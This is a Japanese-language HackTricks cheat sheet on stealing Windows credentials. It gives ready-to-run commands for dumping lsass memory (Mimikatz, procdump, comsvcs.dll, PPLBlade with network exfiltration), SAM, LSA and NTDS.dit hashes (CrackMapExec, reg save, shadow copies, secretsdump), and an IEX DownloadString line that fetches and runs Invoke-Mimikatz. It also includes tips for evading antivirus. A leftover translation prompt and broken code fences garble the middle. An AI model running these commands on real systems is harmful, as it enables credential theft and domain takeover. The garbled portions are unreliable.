# Windowsの資格情報を盗む

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## 資格情報 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatzができる他のことを** [**このページで**](credentials-mimikatz.md) **見つけてください。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**こちらでいくつかの資格情報保護について学びましょう。**](credentials-protections.md) **これらの保護はMimikatzがいくつかの資格情報を抽出するのを防ぐことができます。**

## Meterpreterを使用した資格情報

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)を使用して、被害者の中から**パスワードとハッシュを検索**します。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AVをバイパスする

### Procdump + Mimikatz

**Procdumpは** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **からの正規のMicrosoftツールであるため**、Defenderによって検出されません。\
このツールを使用して**lsassプロセスをダンプし**、**ダンプをダウンロードして**、ダンプから**ローカルで** **資格情報を抽出**することができます。

{% code title="lsassをダンプ" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```
{% endcode %}

{% code title="ダンプからのクレデンシャル抽出" %}
```
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

このプロセスは[SprayKatz](https://github.com/aas-n/spraykatz)を使って自動的に行われます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**: 一部の**AV**は、**procdump.exeを使用してlsass.exeをダンプする**ことを**悪意のある行為**として**検出**することがあります。これは、**"procdump.exe"と"lsass.exe"**という文字列を**検出**しているためです。そのため、**lsass.exeの名前**の代わりにlsass.exeの**PID**をprocdumpに**引数**として**渡す**方が**より隠密**です。

### **comsvcs.dll**を使用してlsassをダンプする

`C:\Windows\System32`にある**comsvcs.dll**というDLLがあり、プロセスが**クラッシュ**するたびにプロセスメモリを**ダンプ**します。このDLLには、`rundll32.exe`で呼び出すことができるように書かれた**`MiniDumpW`**という**関数**が含まれています。\
最初の2つの引数は使用されませんが、3番目の引数は3つの部分に分かれています。最初の部分はダンプされるプロセスID、2番目の部分はダンプファイルの場所、3番目の部分は単語**full**です。他の選択肢はありません。\
これら3つの引数が解析されると、基本的にこのDLLはダンプファイルを作成し、指定されたプロセスをそのダンプファイルにダンプします。\
この機能のおかげで、procdumpをアップロードして実行する代わりに、**comsvcs.dll**を使用してlsassプロセスをダンプすることができます。（この情報は[https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)から抜粋されました）
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
この技術は**SYSTEM**としてのみ実行できることを念頭に置く必要があります。

**このプロセスを自動化するには** [**lssasy**](https://github.com/Hackndo/lsassy)**を使用できます。**

### **タスクマネージャーでlsassをダンプする**

1. タスクバーを右クリックし、タスクマネージャーをクリックします
2. 詳細をクリックします
3. プロセスタブで"Local Security Authority Process"プロセスを探します
4. "Local Security Authority Process"プロセスを右クリックし、"ダンプファイルの作成"をクリックします。

### procdumpでlsassをダンプする

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートの一部であるMicrosoftが署名したバイナリです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBladeを使用したlsassのダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)は、メモリダンプを隠蔽し、ディスクに落とさずにリモートワークステーションに転送することをサポートする保護プロセスダンパーツールです。

**主な機能**:

1. PPL保護のバイパス
2. Defenderの署名ベースの検出メカニズムを回避するためのメモリダンプファイルの隠蔽
3. ディスクに落とさずにRAWおよびSMBアップロード方法でメモリダンプをアップロードする（ファイルレスダンプ）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### SAM ハッシュのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA シークレットのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲットDCからNTDS.ditをダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲットDCからNTDS.ditのパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各NTDS.ditアカウントのpwdLastSet属性を表示
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM の盗み方

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM_ に**配置されている**べきです。しかし、これらは保護されているため、**通常の方法でコピーすることはできません**。

### レジストリから

これらのファイルを盗む最も簡単な方法は、レジストリからコピーを取得することです：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Kaliマシンにこれらのファイルをダウンロードし**、以下を使用して**ハッシュを抽出します**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### ボリューム シャドウ コピー

このサービスを使用して保護されたファイルのコピーを実行できます。管理者である必要があります。

#### vssadmin の使用

vssadmin バイナリは Windows Server バージョンでのみ利用可能です
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、**Powershell**から同じことができます。これは**SAMファイルをコピーする方法**の例です（使用されるハードドライブは"C:"で、C:\users\Publicに保存されます）が、保護されたファイルをコピーするためにこれを使用することができます：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

最後に、[**PSスクリプトInvoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使用して、SAM、SYSTEM、ntds.ditのコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 資格情報 - NTDS.dit**

**Ntds.dit ファイルは Active Directory データを保存するデータベースです**。ユーザーオブジェクト、グループ、グループメンバーシップに関する情報を含んでいます。ドメイン内の全ユーザーのパスワードハッシュも含まれています。

重要な NTDS.dit ファイルは以下の場所にあります: _%SystemRoom%/NTDS/ntds.dit_\
このファイルは _Extensible Storage Engine_ (ESE) データベースで、「公式に」3つのテーブルで構成されています:

* **Data Table**: オブジェクト（ユーザー、グループなど）に関する情報が含まれています。
* **Link Table**: 関係（メンバーなど）に関する情報が含まれています。
* **SD Table**: 各オブジェクトのセキュリティ記述子が含まれています。

これについての詳細情報: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windowsは _Ntdsa.dll_ を使用してこのファイルとやり取りし、_lsass.exe_ によって使用されます。そのため、**NTDS.dit** ファイルの**一部**は **`lsass`** メモリ内に位置している可能性があります（パフォーマンス向上のために **キャッシュ** を使用することにより、最新のアクセスデータが見つかるかもしれません）。

#### NTDS.dit 内のハッシュを復号化する

ハッシュは3回暗号化されます:

1. **BOOTKEY** と **RC4** を使用して Password Encryption Key（**PEK**）を復号化します。
2. **PEK** と **RC4** を使用して **ハッシュ** を復号化します。
3. **DES** を使用して **ハッシュ** を復号化します。

**PEK** は **すべてのドメインコントローラー**で**同じ値**を持っていますが、**ドメインコントローラーの SYSTEM ファイルの BOOTKEY（ドメインコントローラー間で異なる）**を使用して **NTDS.dit** ファイル内で**暗号化**されています。これが、NTDS.dit ファイルから資格情報を取得するためには **NTDS.dit ファイルと SYSTEM ファイル** (_C:\Windows\System32\config\SYSTEM_) が必要な理由です。

### Ntdsutil を使用して NTDS.dit をコピーする

Windows Server 2008 以降で利用可能です。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
以下は、ファイル windows-hardening/stealing-credentials/README.md からのハッキング技術に関するハッキング書籍の内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどのものは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

```
[**ボリュームシャドウコピー**](./#stealing-sam-and-system)のトリックを使用して、**ntds.dit** ファイルのコピーを取ることもできます。**SYSTEM ファイル**のコピーも必要になることを覚えておいてください（再び、[**レジストリからダンプするか、ボリュームシャドウコピー**](./#stealing-sam-and-system)のトリックを使用します）。

### **NTDS.ditからハッシュを抽出する**

**NTDS.dit** と **SYSTEM** ファイルを**取得**したら、_secretsdump.py_ のようなツールを使用して**ハッシュを抽出**できます：
```
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
You can also **自動的に抽出する** 有効なドメイン管理ユーザーを使用して：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
### **NTDS.ditからドメインオブジェクトをSQLiteデータベースに抽出する**

NTDSオブジェクトは、[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)を使用してSQLiteデータベースに抽出できます。シークレットだけでなく、すでに取得された生のNTDS.ditファイルからさらに情報を抽出するために、オブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
```
`SYSTEM` ハイブはオプションですが、秘密の復号化（NT & LM ハッシュ、平文パスワード、kerberos や trust キーなどの補足的な資格情報、NT & LM パスワード履歴）を可能にします。その他の情報とともに、以下のデータが抽出されます：ユーザーとマシンアカウントとそのハッシュ、UACフラグ、最終ログオンとパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループと再帰的なメンバーシップ、組織単位のツリーとメンバーシップ、信頼されたドメインとその信頼の種類、方向、属性...

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードしてください。このバイナリを使用して、複数のソフトウェアから資格情報を抽出できます。
```
```
lazagne.exe all
```
## SAMとLSASSから資格情報を抽出するための他のツール

### Windows credentials Editor (WCE)

このツールはメモリから資格情報を抽出するために使用できます。こちらからダウンロードしてください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAMファイルから資格情報を抽出します
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルから認証情報を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

ダウンロード先：[http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7)。**実行するだけで**パスワードが抽出されます。

## 防御策

[**こちらでいくつかの資格情報保護について学びましょう。**](credentials-protections.md)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください。**

</details>
